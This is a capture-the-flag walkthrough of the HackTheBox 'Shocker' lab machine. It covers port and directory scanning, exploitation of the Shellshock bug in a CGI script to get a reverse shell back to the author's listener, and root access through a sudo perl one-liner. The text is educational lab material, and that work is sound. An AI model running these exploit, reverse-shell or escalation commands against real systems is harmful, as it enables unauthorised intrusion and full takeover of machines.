### Shocker HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.56

Nmap Scan:

```
└─$ nmap -sCV -A 10.10.10.56 -p80
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-02 23:31 WAT
Nmap scan report for 10.10.10.56
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
```

Only one port open 

On navigating to the web server it shows a static page
![image](https://user-images.githubusercontent.com/113513376/216464474-410bc864-7219-4ccc-a035-33c482a74c57.png)

I'll brute force for directory

```
└─$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/common.txt                                           
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/02/02 23:55:50 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 299]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/02/02 23:59:12 Finished
===============================================================

```

We see only /cgi-bin/ this is interesting maybe it might be a `shellshock` vulnerability box 

Lets confirm by fuzzing for files in that directory using different files extension

```
└─$ ffuf -c -u http://10.10.10.56/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .pl,.cgi,.sh,.py -mc all -fw 24,25 -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.56/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .pl .cgi .sh .py 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 403
 :: Filter           : Response words: 24
________________________________________________

user.sh                 [Status: 200, Size: 119, Words: 19, Lines: 8, Duration: 148ms]
:: Progress: [23070/23070] :: Job [1/1] :: 245 req/sec :: Duration: [0:02:01] :: Errors: 0 ::
```

Cool we see there's a bash file in it 

With this we can exploit this box by using shellshock vulnerability

Searching for exploits leads to this [Exploit](https://github.com/b4keSn4ke/CVE-2014-6271)

Lets run it now 

```
┌──(mark__haxor)-[~]
└─$ python3 exploit.py 

*********************************************************************
*   ____  _          _ _     _                _                     *
*  / ___|| |__   ___| | |___| |__   ___   ___| | __  _ __  _   _    *
*  \___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ / | '_ \| | | |   *
*   ___) | | | |  __/ | \__ \ | | | (_) | (__|   < _| |_) | |_| |   *
*  |____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_(_) .__/ \__, |   *
*                                                   |_|    |___/    *
*                                                                   *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*            |E|x|p|l|o|i|t| |b|y| |b|4|k|e|S|n|4|k|e|              *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*                                                                   *
*                                                                   *
*                  https://github.com/b4keSn4ke/                    *
*                                                                   *
*********************************************************************



usage: exploit.py [-h] LHOST LPORT TARGET_URL
exploit.py: error: the following arguments are required: LHOST, LPORT, TARGET_URL
```

We see what's required as an argument

So i'll add that also and run the exploit

```
┌──(mark__haxor)-[~]
└─$ python3 exploit.py 10.10.16.7 1337 http://10.10.10.56/cgi-bin/user.sh

*********************************************************************
*   ____  _          _ _     _                _                     *
*  / ___|| |__   ___| | |___| |__   ___   ___| | __  _ __  _   _    *
*  \___ \| '_ \ / _ \ | / __| '_ \ / _ \ / __| |/ / | '_ \| | | |   *
*   ___) | | | |  __/ | \__ \ | | | (_) | (__|   < _| |_) | |_| |   *
*  |____/|_| |_|\___|_|_|___/_| |_|\___/ \___|_|\_(_) .__/ \__, |   *
*                                                   |_|    |___/    *
*                                                                   *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*            |E|x|p|l|o|i|t| |b|y| |b|4|k|e|S|n|4|k|e|              *
*            +-+-+-+-+-+-+-+ +-+-+ +-+-+-+-+-+-+-+-+-+              *
*                                                                   *
*                                                                   *
*                  https://github.com/b4keSn4ke/                    *
*                                                                   *
*********************************************************************



[+] Protocol detected: HTTP

[+] Setting Payload ...
[+] Sending Payload to http://10.10.10.56/cgi-bin/user.sh ...

[-] Request: timed out received HTTP code 500

[+] Reverse shell from 10.10.10.56 connected to [10.10.16.7:1337].

[+] Payload Sent successfully !
```

Back on the netcat listener 

```
┌──(mark__haxor)-[~]
└─$ nc -lvnp 1337              
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.56] 55950
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

So i'll stabilize the shell 

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z
stty raw -echo;fg
reset
```

Cool so lets escalate priv to root

Checking sudo perm shows we can run perl as root

```
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$ 
```

With this we can call bash 😜

```
Payload: sudo perl -e 'exec "/bin/sh";'
```

Thats what i'll do 

```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -al
total 24
drwx------  3 root root 4096 Sep 21 10:58 .
drwxr-xr-x 23 root root 4096 Sep 21 11:20 ..
lrwxrwxrwx  1 root root    9 Sep 21 10:38 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Sep 21 10:58 .cache
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Feb  2 17:24 root.txt
# 
```

And we're done

<br> <br>
[Back To Home](../../index.md)
